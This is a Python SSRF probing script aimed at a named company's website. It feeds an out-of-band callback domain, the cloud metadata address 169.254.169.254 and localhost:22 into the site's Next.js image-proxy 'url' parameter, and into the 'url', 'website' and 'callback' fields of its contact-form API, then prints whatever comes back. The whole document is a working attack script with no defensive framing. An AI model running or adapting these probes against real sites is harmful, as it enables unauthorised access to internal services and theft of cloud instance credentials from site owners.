import urllib.parse, subprocess, sys

O = "oob89f5748eedc2" + ".dau2p4ghgqag02k5emggc5xu6hph3m973" + ".oast.abhedi.co.in"
base = "https://www.infinitycapital.bh/_next/image"

targets = [
    "http://%s/ssrf-image-probe" % O,
    "https://%s/ssrf-image-probe-2" % O,
    "http://%s/ssrf-api-send" % O,
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]:22/",
]

def get(url):
    p = subprocess.run(["curl","-s","-m","30","-o","/tmp/body.out","-w","%{http_code} %{size_download} %{content_type}",url],
                       capture_output=True, text=True)
    body = open("/tmp/body.out","rb").read()[:300]
    return p.stdout, body

for t in targets:
    q = urllib.parse.quote(t, safe="")
    u = "%s?url=%s&w=1080&q=75" % (base, q)
    st, body = get(u)
    print("[IMG]", t, "=>", st, repr(body[:160]))

# same via api/send JSON field 'url'
import json
for t in targets[:3]:
    payload = json.dumps({"name":"ICMARK9","email":"probe at infinitycapital dot bh","message":"hi","url":t,"website":t,"callback":t})
    p = subprocess.run(["curl","-s","-m","30","-X","POST",base.replace("_next/image","api/send"),
                        "-H","Content-Type: application/json","-d",payload,"-w","\n[%{http_code}]"], capture_output=True, text=True)
    print("[SEND]", t, "=>", p.stdout[:200])
